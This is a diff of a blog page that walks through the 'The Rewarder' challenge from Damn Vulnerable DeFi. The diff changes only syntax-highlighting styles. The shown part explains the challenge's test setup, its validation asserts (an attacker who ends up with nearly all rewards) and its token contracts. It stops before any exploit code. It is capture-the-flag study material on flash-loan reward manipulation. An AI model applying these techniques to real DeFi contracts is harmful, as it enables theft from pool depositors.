@@ -67,7 +67,7 @@ There’s a pool offering rewards in tokens every 5 days for those who deposit t
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.df6f68f5cb2c02f3fdde06bc354beddc0274f59f5027dc878ac1ead43815cfaa.css" integrity="sha256-329o9cssAvP93ga8NUvt3AJ09Z9QJ9yHisHq1DgVz6o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.37b90b4ab2011637071ddd3590a64f81899b71c028d2d366c001566e70ee9e90.css" integrity="sha256-N7kLSrIBFjcHHd01kKZPgYmbccAo0tNmwAFWbnDunpA=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -253,54 +253,54 @@ flash loan in DVT. Has \( 1000000 \) (1 million) DVT&rsquo;s in it.</li>
   </a>
 </h3>
 <p>There are 2 constants:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">constant</span> TOKENS_IN_LENDER_POOL = <span style="color:#ff0;font-weight:bold">1</span>_000_000e18;
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">constant</span> USER_DEPOSIT = <span style="color:#ff0;font-weight:bold">100</span>e18;
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">internal</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">TOKENS_IN_LENDER_POOL</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">1</span><span style="color:#434f54">_000_000e18</span>;
+</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#728e00">internal</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">USER_DEPOSIT</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>;
 </span></span></code></pre></div><p>The first one is used to set initial token balance of the pool
 offering flash loans:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>dvt.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(flashLoanerPool), TOKENS_IN_LENDER_POOL);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoanerPool</span>), <span style="color:#434f54">TOKENS_IN_LENDER_POOL</span>);
 </span></span></code></pre></div><p>The second one is the amount of tokens each user deposits:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint8</span> i; i &lt; <span style="color:#ff0;font-weight:bold">4</span>; i++) {
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Each user gets 100 DVT&#39;s
-</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    dvt.<span style="color:#fff;font-weight:bold">transfer</span>(users[i], USER_DEPOSIT); <span style="color:#007f7f">// &lt;--
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Approve spending of 100 DVT and make a deposit
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    vm.startPrank(users[i]);
-</span></span><span style="display:flex; background-color:#191919"><span>    dvt.approve(<span style="color:#fff;font-weight:bold">address</span>(theRewarderPool), USER_DEPOSIT); <span style="color:#007f7f">// &lt;--
-</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    theRewarderPool.deposit(USER_DEPOSIT); <span style="color:#007f7f">// &lt;--
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// Ensure that the pool&#39;s accounting token increased
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    assertEq(
-</span></span><span style="display:flex;"><span>        theRewarderPool.accToken().balanceOf(users[i]),
-</span></span><span style="display:flex;"><span>        USER_DEPOSIT
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Each user gets 100 DVT&#39;s
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>], <span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Approve spending of 100 DVT and make a deposit
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">theRewarderPool</span>), <span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">deposit</span>(<span style="color:#434f54">USER_DEPOSIT</span>); <span style="color:#95a5a6">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Ensure that the pool&#39;s accounting token increased
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">assertEq</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">accToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]),
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">USER_DEPOSIT</span>
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Initially there are \( 400 \) accounting tokens minted (\( 100 \) tokens
 for each user) and no rewards distributed:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(theRewarderPool.accToken().totalSupply(), USER_DEPOSIT * <span style="color:#ff0;font-weight:bold">4</span>);
-</span></span><span style="display:flex;"><span>assertEq(theRewarderPool.rewardToken().totalSupply(), <span style="color:#ff0;font-weight:bold">0</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">accToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#434f54">USER_DEPOSIT</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">4</span>);
+</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">0</span>);
 </span></span></code></pre></div><p>Then it advances the time \( 5 \) days (the
 minimum duration of round) so that depositors can get
 rewards:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>vm.warp(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> + <span style="color:#ff0;font-weight:bold">5</span> <span style="color:#fff;font-weight:bold">days</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">5</span> <span style="color:#00979d">days</span>);
 </span></span></code></pre></div><p>And calls the <code>distributeRewards()</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint8</span> i; i &lt; <span style="color:#ff0;font-weight:bold">4</span>; i++) {
-</span></span><span style="display:flex;"><span>    vm.prank(users[i]);
-</span></span><span style="display:flex; background-color:#191919"><span>    theRewarderPool.distributeRewards(); <span style="color:#007f7f">// &lt;--
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
-</span></span><span style="display:flex;"><span>    assertEq(theRewarderPool.rewardToken().balanceOf(users[i]), <span style="color:#ff0;font-weight:bold">25</span>e18);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">distributeRewards</span>(); <span style="color:#95a5a6">// &lt;--
+</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]), <span style="color:#8a7b52">25</span><span style="color:#434f54">e18</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>assertEq(theRewarderPool.rewardToken().totalSupply(), <span style="color:#ff0;font-weight:bold">100</span>e18);
+</span></span><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>);
 </span></span></code></pre></div><p>It asserts that:</p>
 <ul>
 <li>Each depositor gets \( 25 \) reward tokens (RWT).</li>
 <li>The are \( 4 × 25 = 100 \) reward tokens (RWT) emitted.</li>
 </ul>
 <p>It also cheks that we start with zero DVT tokens in balance:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(dvt.balanceOf(attacker), <span style="color:#ff0;font-weight:bold">0</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>), <span style="color:#8a7b52">0</span>);
 </span></span></code></pre></div><p>And that the 2 rounds have occurred so far:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(theRewarderPool.roundNumber(), <span style="color:#ff0;font-weight:bold">2</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">roundNumber</span>(), <span style="color:#8a7b52">2</span>);
 </span></span></code></pre></div><p>Next, let&rsquo;s go over the <code>validation()</code> function.</p>
 <h3 id="validation">
   Validation
@@ -310,14 +310,14 @@ rewards:</p>
   </a>
 </h3>
 <p>It asserts that only one round have taken place:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(theRewarderPool.roundNumber(), <span style="color:#ff0;font-weight:bold">3</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">roundNumber</span>(), <span style="color:#8a7b52">3</span>);
 </span></span></code></pre></div><p>Then it ensures that users get negligible rewards this round:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">uint8</span> i; i &lt; <span style="color:#ff0;font-weight:bold">4</span>; i++) {
-</span></span><span style="display:flex;"><span>    vm.prank(users[i]);
-</span></span><span style="display:flex;"><span>    theRewarderPool.distributeRewards();
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> rewardPerUser = theRewarderPool.rewardToken().balanceOf(users[i]);
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> delta = rewardPerUser - <span style="color:#ff0;font-weight:bold">25</span>e18;
-</span></span><span style="display:flex;"><span>    assertLt(delta, <span style="color:#ff0;font-weight:bold">1</span>e16);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">for</span> (<span style="color:#00979d">uint8</span> <span style="color:#434f54">i</span>; <span style="color:#434f54">i</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">4</span>; <span style="color:#434f54">i</span><span style="color:#728e00">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">prank</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">distributeRewards</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardPerUser</span> <span style="color:#728e00">=</span> <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">users</span>[<span style="color:#434f54">i</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">delta</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rewardPerUser</span> <span style="color:#728e00">-</span> <span style="color:#8a7b52">25</span><span style="color:#434f54">e18</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertLt</span>(<span style="color:#434f54">delta</span>, <span style="color:#8a7b52">1</span><span style="color:#434f54">e16</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><ul>
 <li>It calls the <code>distributeRewards()</code> for each user.</li>
@@ -325,14 +325,14 @@ rewards:</p>
 <li>Asserts that it is less than \( 0.01 \) RWT.</li>
 </ul>
 <p>Finally, it checks that rewards have been issued:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertGt(theRewarderPool.rewardToken().totalSupply(), <span style="color:#ff0;font-weight:bold">100</span>e18);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertGt</span>(<span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">totalSupply</span>(), <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span>);
 </span></span></code></pre></div><p>And that the amount of rewards earned by attacker is really
 close to \( 100 \) tokens:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> deltaAttacker = <span style="color:#ff0;font-weight:bold">100</span>e18 - rewardAttacker;
-</span></span><span style="display:flex;"><span>assertLt(deltaAttacker, <span style="color:#ff0;font-weight:bold">1</span>e17);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardAttacker</span> <span style="color:#728e00">=</span> <span style="color:#434f54">theRewarderPool</span>.<span style="color:#434f54">rewardToken</span>().<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00979d">uint256</span> <span style="color:#434f54">deltaAttacker</span> <span style="color:#728e00">=</span> <span style="color:#8a7b52">100</span><span style="color:#434f54">e18</span> <span style="color:#728e00">-</span> <span style="color:#434f54">rewardAttacker</span>;
+</span></span><span style="display:flex;"><span><span style="color:#434f54">assertLt</span>(<span style="color:#434f54">deltaAttacker</span>, <span style="color:#8a7b52">1</span><span style="color:#434f54">e17</span>);
 </span></span></code></pre></div><p>The attacker finishes with zero DVT tokens in balance:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(dvt.balanceOf(attacker), <span style="color:#ff0;font-weight:bold">0</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">assertEq</span>(<span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">attacker</span>), <span style="color:#8a7b52">0</span>);
 </span></span></code></pre></div><p>Let&rsquo;s take a look at the challenge contracts.</p>
 <h3 id="accountingtoken">
   AccountingToken
@@ -345,32 +345,32 @@ close to \( 100 \) tokens:</p>
 <a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot"  class="external-link" target="_blank" rel="noopener">ERC20Snapshot</a>
 and
 <a href="https://docs.openzeppelin.com/contracts/3.x/api/access#AccessControl"  class="external-link" target="_blank" rel="noopener">AccessControl</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> AccountingToken <span style="color:#fff;font-weight:bold">is</span> ERC20Snapshot, AccessControl { ... }
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">AccountingToken</span> <span style="color:#728e00">is</span> <span style="color:#434f54">ERC20Snapshot</span>, <span style="color:#434f54">AccessControl</span> { ... }
 </span></span></code></pre></div><p>The <code>ERC20Snapshot</code> is an <code>ERC20</code> extension that lets you record
 the total supply and balance of an account at the specific point
 in time to retrieve later. The <code>AccessControl</code> contract allows
 to implement role-based access control. <code>AccountingToken</code> uses
 it to define 3 roles: minter, shapshot and burner:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> MINTER_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;MINTER_ROLE&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> SNAPSHOT_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;SNAPSHOT_ROLE&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">bytes32</span> <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">constant</span> BURNER_ROLE = <span style="color:#fff;font-weight:bold">keccak256</span>(<span style="color:#0ff;font-weight:bold">&#34;BURNER_ROLE&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">MINTER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;MINTER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">SNAPSHOT_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;SNAPSHOT_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#00979d">bytes32</span> <span style="color:#728e00">public</span> <span style="color:#728e00">constant</span> <span style="color:#434f54">BURNER_ROLE</span> <span style="color:#728e00">=</span> <span style="color:#728e00">keccak256</span>(<span style="color:#7f8c8d">&#34;BURNER_ROLE&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">constructor</span>() ERC20(<span style="color:#0ff;font-weight:bold">&#34;rToken&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;rTKN&#34;</span>) {
-</span></span><span style="display:flex;"><span>    _setupRole(DEFAULT_ADMIN_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>    _setupRole(MINTER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>    _setupRole(SNAPSHOT_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>    _setupRole(BURNER_ROLE, <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
+</span></span><span style="display:flex;"><span><span style="color:#728e00">constructor</span>() <span style="color:#434f54">ERC20</span>(<span style="color:#7f8c8d">&#34;rToken&#34;</span>, <span style="color:#7f8c8d">&#34;rTKN&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">DEFAULT_ADMIN_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">MINTER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">SNAPSHOT_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">_setupRole</span>(<span style="color:#434f54">BURNER_ROLE</span>, <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>It also has 3 corresponding external functions: <code>mint</code>,
 <code>snapshot</code> and <code>burn</code>.</p>
 <p>The <code>transfer</code> and <code>approve</code> functionality of ERC20 is
 &ldquo;disabled&rdquo;:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _transfer(<span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">pure</span> <span style="color:#fff;font-weight:bold">override</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">revert</span> NotImplemented();
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_transfer</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>, <span style="color:#00979d">uint256</span>) <span style="color:#728e00">internal</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">override</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span> <span style="color:#434f54">NotImplemented</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> _approve(<span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">address</span>, <span style="color:#fff;font-weight:bold">uint256</span>) <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">pure</span> <span style="color:#fff;font-weight:bold">override</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">revert</span> NotImplemented();
+</span></span><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_approve</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>, <span style="color:#00979d">uint256</span>) <span style="color:#728e00">internal</span> <span style="color:#728e00">pure</span> <span style="color:#728e00">override</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">revert</span> <span style="color:#434f54">NotImplemented</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h3 id="rewardtoken">
   RewardToken
@@ -381,30 +381,30 @@ it to define 3 roles: minter, shapshot and burner:</p>
 </h3>
 <p>Defines the minter role and the corresponding function to mint
 reward tokens. It gives that minter role only to the contract creator:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> <span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">12</span>;
